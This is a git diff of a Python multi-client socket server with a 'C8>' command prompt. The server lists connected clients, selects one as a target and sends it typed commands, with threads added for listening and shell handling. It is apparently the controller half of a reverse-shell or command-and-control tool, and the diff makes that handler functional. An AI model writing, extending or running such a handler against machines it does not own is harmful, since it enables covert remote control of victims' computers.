@@ -7,6 +7,9 @@ from queue import Queue
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 print("Server socket has been created!")
 
+#Byte sizes for different kinds of messages
+MSG_LARGE = 201480
+MSG_MED = 1024
 
 NUM_THREADS = 2
 JOB_NUMBER = [1, 2]
@@ -23,32 +26,43 @@ port = None               #Set port as a global variable
 client = None
 addr = None
 
-def bindSocket():
-    global hostIP 
-    global port 
+def create_socket():
+    global hostIP, port, s
+
+    hostIP = '172.17.155.196' #Machine's local IP
+
+    #Prompt user for their desired port
+    port = int(input('Enter port: '))
+
+    s = socket.socket()
+
+def bind_socket():
+    global hostIP
+    global port
     global s
 
     try:
         s.bind((hostIP, port)) #Bind socket to host IP and port
+        s.listen(5)
         print("Socket has been binded to %s" %(port))
-    
+
     except socket.error as msg:
         print("Socket binding error: " + str(msg) + "\n")
 
 
 #JOB 1
 #Accepting connections from several clients
-def acceptingConnection():
+def accepting_connection():
     #Clear all previous connections
     for c in connections:
         c.close()
-    connections.clear()
-    addresses.clear()
+    del connections[:]
+    del addresses[:]
 
     while True:
         try:
             conn, addr = s.accept() #Get Connections
-            s.setblocking(True)     #Prevents connection timeouts
+            s.setblocking(1)     #Prevents connection timeouts
 
             connections.append(conn)
             addresses.append(addr)
@@ -56,8 +70,8 @@ def acceptingConnection():
             print("Connection established with : " + addr[0])
 
 
-        except:
-            print("Socket connections error")
+        except Exception as error:
+            print("Socket connections error",error)
 
 #2nd Thread - Communicating with clients
 # See clients
@@ -65,10 +79,12 @@ def acceptingConnection():
 # Send a command to client
 # (Will be done via a shell for now)
 
+#Main function to run the shell
 def start_shell():
 
     while True:
-        cmd = input("C8> ").split('')
+        #Output command UI
+        cmd = input("C8> ").split(' ')
 
         act = cmd[0]
         args = cmd[1:]
@@ -81,7 +97,7 @@ def start_shell():
                 conn = get_target(args)
                 if conn is not None:
                     send_comms(conn)
-            
+
             case _: #No recognized commands
                 print(act, "command not recognized")
 
@@ -95,15 +111,15 @@ def list_connections():
     for id, conn in enumerate(connections):
         #Check to see if connection is still active
         try:
-            conn.send(str.encode(''))
-            conn.recv(201480)         #Receive a large # of bytes for lack of knowing size
+            conn.send(str.encode(' '))
+            conn.recv(MSG_LARGE)         #Receive a large # of bytes for lack of knowing size
         except:
             del connections[id]
             del addresses[id]
             continue                  #Skip to next connection
 
         results += str(id) + "     " + str(addresses[id]) + "\n"
-    
+
     print("------ Clients ------")
     print(results)
 
@@ -125,11 +141,12 @@ def get_target(args):
         print("Invalid Selection") #Due to invalid index or input
 
 
+#While true loop to send commands to the client
 def send_comms(conn):
     while True:
         try:
             cmd = input()
-            if cmd == quit:
+            if cmd == 'quit':
                 break
             if len(str.encode(cmd)) > 0:
                 conn.send(str.encode(cmd))
@@ -140,18 +157,43 @@ def send_comms(conn):
             break
 
 
+#Threading logic begins below
+
+def create_threads():
+    for _ in range(NUM_THREADS):
+        t = threading.Thread(target=work)
+        t.daemon = True
+        t.start()
+
+def work():
+    while True:
+        task = jobQ.get()
+        if task == 1:
+            create_socket()
+            bind_socket()
+            accepting_connection()
+        elif task == 2:
+            start_shell()
+        jobQ.task_done()
+
+def create_jobs():
+    for x in JOB_NUMBER:
+        jobQ.put(x)
+
+    jobQ.join()
+
+create_threads()
+create_jobs()
 
 #Run the server
-def startServer():        
+def startServer():
     global port, client, addr
 
-    #Prompt user for their desired port
-    port = int(input('Enter port: '))
+    # create_socket()
+    # bind_socket()
 
-    bindSocket()
-
-    client, addr = s.accept()
-    print("Connections established :", addr)
+    # client, addr = s.accept()
+    # print("Connections established :", addr)
 
 #Sends a message to the client
 def sendMessage(msg):
